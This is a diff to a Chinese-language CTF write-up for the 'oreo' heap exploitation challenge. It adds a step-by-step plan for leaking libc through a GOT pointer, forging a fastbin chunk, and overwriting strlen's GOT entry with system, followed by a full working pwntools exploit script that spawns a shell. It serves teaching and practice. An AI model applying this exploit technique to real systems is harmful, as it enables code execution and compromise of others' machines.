@@ -259,7 +259,7 @@ void order_rifles(void)
 }
 ```
 
-这里我们可以看到这个函数会free链表上所有的rifles结构，但是没有设置为NULL
+这里我们可以看到这个函数会free链表上所有的rifles结构，但是没有设置为NULL。
 
 4. leave message
 
@@ -281,7 +281,123 @@ void leave_message(void)
     return;
 }
 ```
-这里会向message(0x804a2a8)这里写入一段内容
+这里会向*message(0x804a2a8 -> 0x804a2c0)这里写入一段内容,因此我们可以想办法控制message所存储的指针来实现任意写的效果。
+
+
+
+#### 利用思路
+
+1. 首先，我们可以覆盖node -> prev，把printf的got地址写入该字段，然后通过show_rifles函数泄漏printf的实际地址。
+
+
+
+1. - 我们可以在0x804a2a0处伪造一个chunk，由于一个rifle的大小为0x38，因此我们选择伪造size为0x41的fastbin chunk。这时我们发现0x804a2a4即rifles_count，这个值正好是chunk的size字段，因此我们可以在free这个chunk之前 add 0x41个rifles就可以控制其大小。
+   - 但是这里还有一点需要注意，我们还需要修改下一个物理相邻chunk的size，我们算了一下偏移，0x804a2a0 + 0x40 = 0x804a2e0,这个地方就是next_chunk的size字段，我们可以通过leave_message()来覆盖这个字段，*message即0x804a2c0这里写入一段信息，我们计算一下偏移0x804a2e0 - 0x804a2c0 = 0x20 == 32. 再加上4个字节覆盖掉prev_size,因此一共输入36个字节的padding就能到达size字段。所以paload = '\x00' * 36 + p32(0x41)
+   - 这里之所以用\x00做padding是因为要把fake_chunk的prev设成null，否则free之后会出错。
+2. 最后，我们就重新分配rifle，获得刚刚伪造的chunk，然后覆盖message指针的地址，将其设置为strlen()函数的got地址，然后leave_message()用system()覆盖got表,即可getshell。
+
+到这里思路已经十分明确了，payload如下：
+
+```python
+#!  /usr/bin/env    python2
+from pwn import *
+
+sh = process("./oreo")
+elf = ELF("./oreo")
+libc = ELF("./libc.so.6")
+
+context.log_level = "debug"
+
+# address
+printf_got = elf.got['printf']
+log.info("printf_got -> " + hex(printf_got))
+printf_libc = libc.symbols['printf']
+log.info("printf_libc -> " + hex(printf_libc))
+system_libc = libc.symbols['system']
+log.info("system_libc -> " + hex(system_libc))
+message_addr = 0x0804a2a8
+log.info("message_addr -> " + hex(message_addr))
+strlen_got = elf.got['strlen']
+log.info("strlen_got -> " + hex(strlen_got))
+
+
+def add_refles(name,desc):
+    sh.sendline("1")
+    sh.sendline(name)
+    sh.sendline(desc)
+
+def show_refles():
+    sh.sendline("2")
+
+def leave_message(content):
+    sh.sendline("4")
+    sh.sendline(content)
+
+def leak_addr():
+    name = 'a' * 27 + p32(printf_got)
+    desc = 'b'
+    log.info("name -> " + name)
+    log.info("desc -> " + desc)
+    
+    # add refle and overwrite the prev_riles
+    add_refles(name, desc)
+
+    # leak printf_addr
+    show_refles()
+    sh.recvuntil("Description: ")
+    sh.recvuntil("Description: ")
+    printf_addr = u32(sh.recvn(4))
+    log.info("printf_addr -> " + hex(printf_addr))
+
+    return printf_addr
+
+def get_system_addr(addr, libc_addr):
+    base = addr - libc_addr
+    system_addr = base + system_libc
+    log.info("system_addr -> " + hex(system_addr))
+    return system_addr
+
+def fake_chunk():
+    # We need to make the size of chunk 0x41
+    for i in range(0x40-1):
+        add_refles(str(i), "fuck u")
+
+    # make a chunk to set the house into link
+    name = 'a' * 27 + p32(message_addr)
+    desc = "fuck U!"
+    log.info("name -> " + name)
+    log.info("desc -> " + desc)
+    add_refles(name, desc)
+
+def order_refles():
+    sh.sendline("3")
+
+def main():
+    printf_addr = leak_addr()
+    system_addr = get_system_addr(printf_addr, printf_libc)
+    fake_chunk()
+
+    # The padding's length is from message to the next chunk size 
+    # padding = padding * (0xa0 + 0x40 - 0xc0 + 4) + p32(0x41) 
+    padding= "\x00\x00\x00\x00"*9 + p32(0x41)
+    leave_message(padding)
+    order_refles()
+
+    show_refles()
+    # Overwrite the strlen_got
+    name = 'fuck U~'
+    desc = p32(strlen_got)
+    add_refles(name, desc)
+
+    leave_message(p32(system_addr)+ ";/bin/sh\x00")
+
+    sh.interactive()
+
+
+main()
+```
+
+&emsp;&emsp;这里有个点值得注意，我们最后一步覆盖system_got的时候可以直接传`p32(system_addr) + ";/bin/sh\x00"`.因为,在strlen被覆盖之后，会执行`addEnd()`函数，相当于`strlen(p32(system_addr) + ";/bin/sh\x00".)`即`system(p32(system_addr)) 和 system("/bin/sh\x00")`这样就可以快速getshell。当然，也可以覆盖其他函数的got表，比如sscanf，然后在输入的action的时候输入`/bin/sh`也可getshell。
 
 
 
